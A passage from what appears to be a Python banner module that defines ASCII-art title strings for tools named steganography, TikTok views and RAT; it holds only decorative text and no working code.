                .=+=-:....          ....:-**=.                             
               :+=-:...               ....:=+=.                            
              :++-:...                  ...:==-.                           
             .=+=:...                    ..:-==:                           
             .*=- ..                      ..:=-=                           
             :+=:...                      ..:--=                           
             :+=: ..                      ..:-++                           
             :==- ..                      ..:-*+                           
             .===. ..                    ..::=+:                           
              :-+-. ..                  ...:==-.                           
               -=#-. ..                ..::==-.                            
                :#%+-:....          ....:-=+=:.                            
                  =*++-::............::-=+++*+-.                           
                   .-+=++--::::::::--=#*=:.--*+.:..                        
                      .:****####%%%#++.     .:-#**#*-                      
                             ....             .-#++=**-.                   
                                               :*##+==*+-.                 
                                                 :*##++=++-                
                                                   :*#%++-*+-              
                                                     :###*+-*+-            
                                     ........          :*##+==++-          
                                  ...................    -*##+==*+:        
                                         ......::::::::....-###+=-*+:      
                                                  ...:::::---=###+==*.     
                                                       ..::--==+##**+=:.   
                                                            ..:-=++-+*+.   
                                                                 ..:::     
                                                               
"""

steganography_banner = primary + r"""
                  ......:::::::::::::.....         
            ........::::::::::::::::::::.......    
          ..............:::::::::::::............  
         ...................:::::::...:::::....... 
        ..........:::::...........:::::::::....... 
        ....-=++*+++=::...........::.::--===--:....
        .:-**++==++*#%#=:..........-+%%##*+===++-..
        .:+::::::::=+*#%%#-......-#@%#+-::::::::=:.
        :::.......::::-*##-......=##=:::::.......:.
        ..........:::.:::..........::::::..........
        :.....:--==+==--::........::::--===-:......
        .::::-*@@@@@@@@%-.....:....-#@@@@@@@%=:....
        ::::::---=++=--::....::.....:--=++=-:::....
        :......::::::::......::.......::::.........
        .....................:::...................
        .:....................::...................
        .::...................:....................
         :::::::::::--:.......:.......--::::...... 
         .:::-----::..........::........::---::::. 
          .::=**-.......:-------::--:......-**=:.  
           :::-**=:......:+*#%%#*+-.......=**-:..  
           .::::+#*+++==+**##+=*#*++==+==+*+::..   
            .:::::-=+*####%#-:::+#****++=-:.:...   
             .::::::.:::-==========-:.....::::.    
              .::::::::::::::::::::::::::::::.     
               .:::::::::-+#@@@@%*=:::..::::.      
                .::::::::::-*@@%=:::..:::::.       
                  .::::::::-*%@%+:....::::.        
                   .:::::::-#@@%*:....::.          
                     .:-:::-*@@%+:::::.            
                       .:---+@@%=:::.              
                         ..:=%%+-:.                
"""

Tiktok_views_banner = primary + r"""
▄▄▄█████▓ ██▓ ██ ▄█▀▄▄▄█████▓ ▒█████   ██ ▄█▀    ██▒   █▓ ██▓▓█████  █     █░  ██████ 
▓  ██▒ ▓▒▓██▒ ██▄█▒ ▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒    ▓██░   █▒▓██▒▓█   ▀ ▓█░ █ ░█░▒██    ▒ 
▒ ▓██░ ▒░▒██▒▓███▄░ ▒ ▓██░ ▒░▒██░  ██▒▓███▄░     ▓██  █▒░▒██▒▒███   ▒█░ █ ░█ ░ ▓██▄   
░ ▓██▓ ░ ░██░▓██ █▄ ░ ▓██▓ ░ ▒██   ██░▓██ █▄      ▒██ █░░░██░▒▓█  ▄ ░█░ █ ░█   ▒   ██▒
  ▒██▒ ░ ░██░▒██▒ █▄  ▒██▒ ░ ░ ████▓▒░▒██▒ █▄      ▒▀█░  ░██░░▒████▒░░██▒██▓ ▒██████▒▒
  ▒ ░░   ░▓  ▒ ▒▒ ▓▒  ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒      ░ ▐░  ░▓  ░░ ▒░ ░░ ▓░▒ ▒  ▒ ▒▓▒ ▒ ░
    ░     ▒ ░░ ░▒ ▒░    ░      ░ ▒ ▒░ ░ ░▒ ▒░      ░ ░░   ▒ ░ ░ ░  ░  ▒ ░ ░  ░ ░▒  ░ ░
  ░       ▒ ░░ ░░ ░   ░      ░ ░ ░ ▒  ░ ░░ ░         ░░   ▒ ░   ░     ░   ░  ░  ░  ░  
          ░  ░  ░                ░ ░  ░  ░            ░   ░     ░  ░    ░          ░  
                                                     ░                                
"""

rat_banner = primary + r"""
                                                                                                    
                      .............                                                                 
                   ..-+++****#*+*%%*-.                                                              
               .-###+...      ...:..-*%*:-...                                                       
              .*%=.                     :=*=#-                                                      
           ..%*...                        ....:###..                                                
          .#.+*..                               ...#@-.       .%#@=                                 
      ..-#%-:=..           ....=+:.                  ..+++%=+:::.:.+...             .-.  -.         
        ..+=*.           ..::----=-.                       ........:+*#%=....        .-. :. ..      
        .++.            .+:..:----::                       .-+**=-.     .:*#-:.     ..:. :....      
      .-#:+:          ..=#@#+=-........                   :#.. ....=+-..  ...:-*-..  ::..=..=.      
     .=+#=.          .:-.  ..=*%#*++=-.                   -#.   .*=-*=::        ..+. .:.-..-.       
     .+@-             .. .+-......=+*+=:                 ..-@+....#*-.*:    ..+=...:+..:.:...=-:.   
    .+@:                 ....*+:.. .=##+.                -+=..:*%#=-*+=.    .*@@%.  .--..-...       
    .@...                 ..  ..%*...-#-.               :#:..      :++*..       ..    .:-..         
    ..*+.                     ....==.:*%=..             .:+=.        .-*.  ..:. ........+:.         
    .=#. .:.                        ...++:.              -#-..        .=:  ..-:.:.::.:-.            
    .**:=:-.                             .:. .           :=+=-=................+%#*+++:....         
    .+%+++-.                               ..-            ::*+-+*:++-++*+=-**.::::. :..- ...        
     .==::*..:..                          ..%.....:         ....-.-.......... .-.-. .:... ..        
     :#.:+%-+*:.                    .... .***#--=%-:             .+- ..-+*=..:. .=  .-.  ..         
     =#..-#.*-**=.-.::..-........--*-+*:*=-:**%%-*:#%@@@+.=*++-*+*-....=*+*@**. ::  .-:             
     =@+..*:  .+..=%:%++%+#+.%+%=%-..-..  :=. ..-%@@@.     ....-%@@%%-:@*--*#@. -:   .-.            
     .@*. .*.       .*@@@@@@@@@%#*+*#%@%##@=.*%.=%%*-.               ..:+-.     .-.   ...           
     .:@+...:*...                         ...::-.        .............                              
      ..%@:.  .**-.                             ..::-==+**+=------==**+=:..                         
        .:#%=......-+++=-:.............::-=++*+=-..:-=+#@%#*==---===+*#%#+*+-.                      
           .:*@#=..       ...:::::::...  ..:=+#%%#+-:..                  .:+#*+..                   
              ...-=*%%%#*+======+*##%@@#*=-:.....                          ...=#:                   
                        ..........                                                                  
                                                                                                    
                                                                                                    
"""